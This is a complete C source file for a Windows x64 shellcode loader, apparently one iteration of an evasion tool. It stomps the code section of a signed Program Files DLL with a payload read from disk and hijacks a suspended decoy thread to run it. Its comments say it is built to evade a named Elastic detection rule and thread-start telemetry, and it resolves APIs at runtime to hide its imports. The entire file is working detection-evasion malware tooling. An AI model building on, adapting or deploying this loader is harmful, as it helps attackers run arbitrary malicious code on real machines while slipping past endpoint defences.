/*
 * Iteration 3 — x64 shellcode loader
 * Techniques: thread_hijacking_local + module_stomping (Program Files donor)
 * Build (MSVC x64):
 *   cl.exe /nologo /O2 /GS- loader.c
 * Run:
 *   loader.exe C:\path\to\calc.bin
 *
 * Change from Iter 2: the donor DLL is selected at runtime from a list of
 * signed DLLs known to live under C:\Program Files (or C:\Program Files
 * (x86)).  Any candidate whose on-disk path starts with
 * C:\Windows\System32 or C:\Windows\SysWOW64 is explicitly rejected, because
 * that path is the exact condition-3 conjunct of Elastic's
 * "Suspicious System Module Image Hollowing" rule.  The stomping and
 * thread-hijack mechanics are otherwise unchanged.
 *
 * Iter-3 review fix: removed the version-pinned .NET path
 * ("...Microsoft.NETCore.App\\6.0.0\\coreclr.dll") and replaced it with a
 * runtime directory scan so the loader does not depend on a specific
 * installed runtime version.
 */

#include <windows.h>
#include <winnt.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>

/* ---- Function pointer typedefs for runtime-resolved APIs ---- */
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL   (WINAPI *pVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef HMODULE(WINAPI *pLoadLibraryA)(LPCSTR);
typedef HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                       LPTHREAD_START_ROUTINE, LPVOID,
                                       DWORD, LPDWORD);
typedef BOOL   (WINAPI *pGetThreadContext)(HANDLE, LPCONTEXT);
typedef BOOL   (WINAPI *pSetThreadContext)(HANDLE, const CONTEXT *);
typedef DWORD  (WINAPI *pResumeThread)(HANDLE);
typedef DWORD  (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
typedef BOOL   (WINAPI *pCloseHandle)(HANDLE);
typedef BOOL   (WINAPI *pTerminateThread)(HANDLE, DWORD);
typedef FARPROC(WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI *pGetModuleHandleA)(LPCSTR);
typedef DWORD  (WINAPI *pGetModuleFileNameA)(HMODULE, LPSTR, DWORD);

/* ---- Globals holding resolved pointers ---- */
static pVirtualAlloc            dyn_VirtualAlloc            = NULL;
static pVirtualProtect          dyn_VirtualProtect          = NULL;
static pVirtualFree             dyn_VirtualFree             = NULL;
static pLoadLibraryA            dyn_LoadLibraryA            = NULL;
static pCreateThread            dyn_CreateThread            = NULL;
static pGetThreadContext        dyn_GetThreadContext        = NULL;
static pSetThreadContext        dyn_SetThreadContext        = NULL;
static pResumeThread            dyn_ResumeThread            = NULL;
static pWaitForSingleObject     dyn_WaitForSingleObject     = NULL;
static pCloseHandle             dyn_CloseHandle             = NULL;
static pTerminateThread         dyn_TerminateThread         = NULL;
static pGetModuleFileNameA      dyn_GetModuleFileNameA      = NULL;

/*
 * Decoy stub — module-backed thread start routine. Lives in OUR image's
 * .text section, so CreateThread telemetry records a module-backed
 * StartAddress rather than the payload.
 */
static DWORD WINAPI DecoyStub(LPVOID lpParam)
{
    (void)lpParam;
    ExitThread(0);
    return 0; /* unreachable */
}

/* Resolve a symbol from a module handle; abort on failure. */
static FARPROC resolve(HMODULE mod, LPCSTR name, pGetProcAddress gpa)
{
    FARPROC p = gpa(mod, name);
    if (!p) {
        fprintf(stderr, "[-] GetProcAddress(%s) failed: %lu\n",
                name, GetLastError());
        ExitProcess(1);
    }
    return p;
}

/* Case-insensitive ASCII prefix test. */
static int starts_with_ci(const char* s, const char* prefix)
{
    if (!s || !prefix) return 0;
    while (*prefix) {
        char a = *s++;
        char b = *prefix++;
        if (a >= 'A' && a <= 'Z') a = (char)(a - 'A' + 'a');
        if (b >= 'A' && b <= 'Z') b = (char)(b - 'A' + 'a');
        if (a != b) return 0;
    }
    return 1;
}

/* Case-insensitive substring test (ASCII). */
static int contains_ci(const char* s, const char* needle)
{
    size_t nlen;
    if (!s || !needle) return 0;
    nlen = strlen(needle);
    if (nlen == 0) return 1;
    for (; *s; ++s) {
        size_t i;
        for (i = 0; i < nlen; ++i) {
            char a = s[i];
            char b = needle[i];
            if (a == 0) return 0;
            if (a >= 'A' && a <= 'Z') a = (char)(a - 'A' + 'a');
            if (b >= 'A' && b <= 'Z') b = (char)(b - 'A' + 'a');
            if (a != b) break;
        }
        if (i == nlen) return 1;
    }
    return 0;
}

/*
 * Return non-zero if the path is under C:\Windows\System32 or
 * C:\Windows\SysWOW64 — the exact condition-3 trigger of the hollowing rule.
 * We must NEVER stomp a donor in these directories.
 */
static int is_system32_path(const char* path)
{
    if (!path) return 0;
    if (starts_with_ci(path, "c:\\windows\\system32\\")) return 1;
    if (starts_with_ci(path, "c:\\windows\\syswow64\\")) return 1;
    /* Some hosts report via short path or with different casing. */
    if (contains_ci(path, "\\windows\\system32\\")) return 1;
    if (contains_ci(path, "\\windows\\syswow64\\")) return 1;
    return 0;
}

/* Return non-zero if path is under C:\Program Files or C:\Program Files (x86). */
static int is_program_files_path(const char* path)
{
    if (!path) return 0;
    if (starts_with_ci(path, "c:\\program files\\"))       return 1;
    if (starts_with_ci(path, "c:\\program files (x86)\\")) return 1;
    /* Fallback: match anywhere (handles \\?\ prefixes, etc.). */
    if (contains_ci(path, "\\program files\\"))            return 1;
    if (contains_ci(path, "\\program files (x86)\\"))      return 1;
    return 0;
}

/* Join a directory and a leaf name into dst (MAX_PATH cap). */
static int join_path(char* dst, size_t dstsz, const char* dir, const char* leaf)
{
    size_t dl = dir ? strlen(dir) : 0;
    size_t ll = leaf ? strlen(leaf) : 0;
    int need_sep;
    if (!dst || dstsz == 0 || !leaf) return 0;
    if (dl + ll + 2 > dstsz) return 0;
    need_sep = (dl > 0 && dir[dl - 1] != '\\' && dir[dl - 1] != '/');
    memcpy(dst, dir, dl);
    if (need_sep) dst[dl++] = '\\';
    memcpy(dst + dl, leaf, ll);
    dst[dl + ll] = '\0';
    return 1;
}

/*
 * Locate the executable .text (or first code) section of a mapped image.
 * Returns 1 on success and fills out_base/out_size.
 */
static int find_exec_section(BYTE* base, BYTE** out_base, SIZE_T* out_size)
{
    IMAGE_DOS_HEADER* dos;
    IMAGE_NT_HEADERS* nt;
    IMAGE_SECTION_HEADER* sec;
    IMAGE_SECTION_HEADER* fallback = NULL;
    BYTE* text_base = NULL;
    SIZE_T text_size = 0;
    WORD i;

    *out_base = NULL;
    *out_size = 0;

    dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (!(sec->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;

        if (strncmp((const char*)sec->Name, ".text", 8) == 0) {
            text_base = base + sec->VirtualAddress;
            text_size = sec->Misc.VirtualSize;
            break;
        }
        if (!fallback && (sec->Characteristics & IMAGE_SCN_CNT_CODE)) {
            fallback = sec;
        }
    }
    if (!text_base && fallback) {
        text_base = base + fallback->VirtualAddress;
        text_size = fallback->Misc.VirtualSize;
    }
    if (!text_base || text_size == 0) return 0;

    *out_base = text_base;
    *out_size = text_size;
    return 1;
}

/*
 * Try to load a donor by full path, then verify:
 *   - its on-disk path is under C:\Program Files (or Program Files (x86))
 *   - its on-disk path is NOT under C:\Windows\System32 or SysWOW64
 *   - its .text section is >= 10000 bytes
 * Returns the module handle and fills the executable section bounds.
 */
static HMODULE try_donor(const char* path,
                         BYTE** out_text, SIZE_T* out_size)
{
    HMODULE h;
    char full[MAX_PATH];
    DWORD n;

    *out_text = NULL;
    *out_size = 0;

    h = dyn_LoadLibraryA(path);
    if (!h) return NULL;

    n = dyn_GetModuleFileNameA(h, full, MAX_PATH);
    if (n == 0 || n >= MAX_PATH) return NULL;

    /* Hard reject: System32/SysWOW64 is the exact condition-3 trigger. */
    if (is_system32_path(full)) {
        fprintf(stderr, "[!] rejecting System32 donor: %s\n", full);
        return NULL;
    }
    /* Require Program Files. */
    if (!is_program_files_path(full)) {
        fprintf(stderr, "[!] donor not under Program Files: %s\n", full);
        return NULL;
    }

    if (!find_exec_section((BYTE*)h, out_text, out_size)) {
        fprintf(stderr, "[!] donor has no usable .text: %s\n", full);
        return NULL;
    }
    if (*out_size < 10000) {
        fprintf(stderr, "[!] donor .text too small (%zu): %s\n",
                (size_t)*out_size, full);
        return NULL;
    }

    fprintf(stderr, "[+] donor selected: %s  (.text=%zu bytes)\n",
            full, (size_t)*out_size);
    return h;
}

/*
 * Enumerate a directory and try every *.dll inside it (recursively one level
 * is NOT performed — we only scan the given directory).  Returns the first
 * donor that passes try_donor(), or NULL.
 */
static HMODULE try_donor_dir(const char* dir, BYTE** out_text, SIZE_T* out_size)
{
    char pattern[MAX_PATH];
    WIN32_FIND_DATAA fd;
    HANDLE hf;
    HMODULE result = NULL;

    if (!join_path(pattern, sizeof(pattern), dir, "*.dll")) return NULL;

    hf = FindFirstFileA(pattern, &fd);
    if (hf == INVALID_HANDLE_VALUE) return NULL;

    do {
        char candidate[MAX_PATH];
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (!join_path(candidate, sizeof(candidate), dir, fd.cFileName)) continue;

        result = try_donor(candidate, out_text, out_size);
        if (result) break;
    } while (FindNextFileA(hf, &fd));

    FindClose(hf);
    return result;
}

/*
 * Enumerate C:\Program Files\dotnet\shared\Microsoft.NETCore.App\<ver>\
 * and try coreclr.dll in each version directory.  This replaces the
 * previously hardcoded "6.0.0" path so the loader works regardless of which
 * .NET runtime version(s) are installed.
 */
static HMODULE try_dotnet_coreclr(BYTE** out_text, SIZE_T* out_size)
{
    static const char* roots[] = {
        "C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App",
        "C:\\Program Files (x86)\\dotnet\\shared\\Microsoft.NETCore.App",
        NULL
    };
    int r;
    for (r = 0; roots[r]; ++r) {
        char pattern[MAX_PATH];
        WIN32_FIND_DATAA fd;
        HANDLE hf;
        HMODULE m = NULL;

        if (!join_path(pattern, sizeof(pattern), roots[r], "*")) continue;
        hf = FindFirstFileA(pattern, &fd);
        if (hf == INVALID_HANDLE_VALUE) continue;

        do {
            char ver_dir[MAX_PATH];
            char dll[MAX_PATH];
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            if (strcmp(fd.cFileName, ".") == 0) continue;
            if (strcmp(fd.cFileName, "..") == 0) continue;
            if (!join_path(ver_dir, sizeof(ver_dir), roots[r], fd.cFileName)) continue;
            if (!join_path(dll, sizeof(dll), ver_dir, "coreclr.dll")) continue;

            m = try_donor(dll, out_text, out_size);
            if (m) break;
        } while (FindNextFileA(hf, &fd));

        FindClose(hf);
        if (m) return m;
    }
    return NULL;
}

/*
 * Donor selection: try a small set of well-known Program Files DLLs first,
 * then fall back to directory enumeration for the .NET runtime (version-
 * independent) and Common Files subdirectories.
 */
static HMODULE select_donor(BYTE** out_text, SIZE_T* out_size)
{
    static const char* candidates[] = {
        /* Windows Media Player (present on most desktop SKUs). */
        "C:\\Program Files\\Windows Media Player\\wmp.dll",
        "C:\\Program Files (x86)\\Windows Media Player\\wmp.dll",
        "C:\\Program Files\\Windows Media Player\\wmpnetwork.dll",
        "C:\\Program Files (x86)\\Windows Media Player\\wmpnetwork.dll",
        /* Common Files (very widely present). */
        "C:\\Program Files\\Common Files\\microsoft shared\\ink\\TipBand.dll",
        "C:\\Program Files (x86)\\Common Files\\microsoft shared\\ink\\TipBand.dll",
        "C:\\Program Files\\Common Files\\System\\ado\\msado15.dll",
        "C:\\Program Files (x86)\\Common Files\\System\\ado\\msado15.dll",
        /* Internet Explorer / Edge legacy component in Program Files. */
        "C:\\Program Files\\Internet Explorer\\ieproxy.dll",
        "C:\\Program Files (x86)\\Internet Explorer\\ieproxy.dll",
        NULL
    };

    static const char* dirs[] = {
        "C:\\Program Files\\Common Files\\System\\ado",
        "C:\\Program Files (x86)\\Common Files\\System\\ado",
        "C:\\Program Files\\Common Files\\microsoft shared\\ink",
        "C:\\Program Files (x86)\\Common Files\\microsoft shared\\ink",
        NULL
    };

    int i;
    HMODULE h;

    for (i = 0; candidates[i] != NULL; ++i) {
        h = try_donor(candidates[i], out_text, out_size);
        if (h) return h;
    }

    /* Version-independent .NET runtime scan (replaces hardcoded 6.0.0). */
    h = try_dotnet_coreclr(out_text, out_size);
    if (h) return h;

    /* Enumerate well-known Common Files subdirectories. */
    for (i = 0; dirs[i] != NULL; ++i) {
        h = try_donor_dir(dirs[i], out_text, out_size);
        if (h) return h;
    }

    return NULL;
}

int main(int argc, char* argv[])
{
    HMODULE hKernel32;
    pGetProcAddress gpa;

    if (argc < 2) {
        fprintf(stderr, "usage: %s <shellcode.bin>\n", argv[0]);
        return 1;
    }

    /* ---- 0. Resolve APIs at runtime to shrink the static import table ---- */
    hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        fprintf(stderr, "[-] GetModuleHandleA(kernel32) failed: %lu\n",
                GetLastError());
        return 1;
    }
    gpa = (pGetProcAddress)GetProcAddress(hKernel32, "GetProcAddress");
    if (!gpa) {
        fprintf(stderr, "[-] bootstrap GetProcAddress failed\n");
        return 1;
    }

    dyn_VirtualAlloc        = (pVirtualAlloc)       resolve(hKernel32, "VirtualAlloc",        gpa);
    dyn_VirtualProtect      = (pVirtualProtect)     resolve(hKernel32, "VirtualProtect",      gpa);
    dyn_VirtualFree         = (pVirtualFree)        resolve(hKernel32, "VirtualFree",         gpa);
    dyn_LoadLibraryA        = (pLoadLibraryA)       resolve(hKernel32, "LoadLibraryA",        gpa);
    dyn_CreateThread        = (pCreateThread)       resolve(hKernel32, "CreateThread",        gpa);
    dyn_GetThreadContext    = (pGetThreadContext)   resolve(hKernel32, "GetThreadContext",    gpa);
    dyn_SetThreadContext    = (pSetThreadContext)   resolve(hKernel32, "SetThreadContext",    gpa);
    dyn_ResumeThread        = (pResumeThread)       resolve(hKernel32, "ResumeThread",        gpa);
    dyn_WaitForSingleObject = (pWaitForSingleObject)resolve(hKernel32, "WaitForSingleObject", gpa);
    dyn_CloseHandle         = (pCloseHandle)        resolve(hKernel32, "CloseHandle",         gpa);
    dyn_TerminateThread     = (pTerminateThread)    resolve(hKernel32, "TerminateThread",     gpa);
    dyn_GetModuleFileNameA  = (pGetModuleFileNameA) resolve(hKernel32, "GetModuleFileNameA",  gpa);

    /* ---- 1. Read shellcode from file (no hardcoded bytes) ---- */
    {
        FILE* fp;
        long fsz;
        SIZE_T sc_size;
        unsigned char* sc;
        size_t got;

        fp = fopen(argv[1], "rb");
        if (!fp) {
            fprintf(stderr, "[-] fopen failed for %s (errno=%d)\n",
                    argv[1], errno);
            return 1;
        }
        if (fseek(fp, 0, SEEK_END) != 0) { fclose(fp); return 1; }
        fsz = ftell(fp);
        if (fsz <= 0) { fclose(fp); fprintf(stderr, "[-] empty file\n"); return 1; }
        if (fseek(fp, 0, SEEK_SET) != 0) { fclose(fp); return 1; }

        sc_size = (SIZE_T)fsz;
        sc = (unsigned char*)malloc(sc_size);
        if (!sc) { fclose(fp); return 1; }

        got = fread(sc, 1, sc_size, fp);
        fclose(fp);
        if (got != sc_size) {
            fprintf(stderr, "[-] short read\n");
            free(sc);
            return 1;
        }

        /* ---- 2. Select a Program Files donor at runtime ---- */
        {
            BYTE* text_base = NULL;
            SIZE_T text_size = 0;
            HMODULE hDonor = select_donor(&text_base, &text_size);
            DWORD oldProt = 0;
            DWORD tmp = 0;
            HANDLE th;
            CONTEXT ctx;

            if (!hDonor || !text_base || text_size == 0) {
                fprintf(stderr, "[-] no suitable Program Files donor found\n");
                SecureZeroMemory(sc, sc_size);
                free(sc);
                return 1;
            }
            if (sc_size > text_size) {
                fprintf(stderr, "[-] payload (%zu) larger than .text (%zu)\n",
                        (size_t)sc_size, (size_t)text_size);
                SecureZeroMemory(sc, sc_size);
                free(sc);
                return 1;
            }

            /* ---- 3. Overwrite donor .text with payload (RW -> memcpy -> RX) ---- */
            if (!dyn_VirtualProtect(text_base, text_size, PAGE_READWRITE, &oldProt)) {
                fprintf(stderr, "[-] VirtualProtect(RW on donor .text) failed: %lu\n",
                        GetLastError());
                SecureZeroMemory(sc, sc_size);
                free(sc);
                return 1;
            }
            memcpy(text_base, sc, sc_size);
            SecureZeroMemory(sc, sc_size);
            free(sc);
            sc = NULL;

            if (!dyn_VirtualProtect(text_base, text_size, PAGE_EXECUTE_READ, &tmp)) {
                fprintf(stderr, "[-] VirtualProtect(RX on donor .text) failed: %lu\n",
                        GetLastError());
                return 1;
            }

            /* ---- 4. thread_hijacking_local ----
             * Create a suspended thread whose start routine is a benign stub
             * inside our own image.  Its recorded StartAddress is
             * module-backed.  We then flip RIP to the stomped Program Files
             * donor's .text and resume.
             */
            th = dyn_CreateThread(NULL, 0,
                                  (LPTHREAD_START_ROUTINE)DecoyStub,
                                  NULL,
                                  CREATE_SUSPENDED,
                                  NULL);
            if (!th) {
                fprintf(stderr, "[-] CreateThread(suspended) failed: %lu\n",
                        GetLastError());
                return 1;
            }

            ZeroMemory(&ctx, sizeof(ctx));
            ctx.ContextFlags = CONTEXT_CONTROL;
            if (!dyn_GetThreadContext(th, &ctx)) {
                fprintf(stderr, "[-] GetThreadContext failed: %lu\n", GetLastError());
                dyn_TerminateThread(th, 0);
                dyn_CloseHandle(th);
                return 1;
            }

            ctx.Rip = (DWORD64)(ULONG_PTR)text_base;

            if (!dyn_SetThreadContext(th, &ctx)) {
                fprintf(stderr, "[-] SetThreadContext failed: %lu\n", GetLastError());
                dyn_TerminateThread(th, 0);
                dyn_CloseHandle(th);
                return 1;
            }

            if (dyn_ResumeThread(th) == (DWORD)-1) {
                fprintf(stderr, "[-] ResumeThread failed: %lu\n", GetLastError());
                dyn_TerminateThread(th, 0);
                dyn_CloseHandle(th);
                return 1;
            }

            /* ---- 5. Wait for the payload thread to finish, then clean up. ---- */
            dyn_WaitForSingleObject(th, INFINITE);
            dyn_CloseHandle(th);
        }
    }

    return 0;
}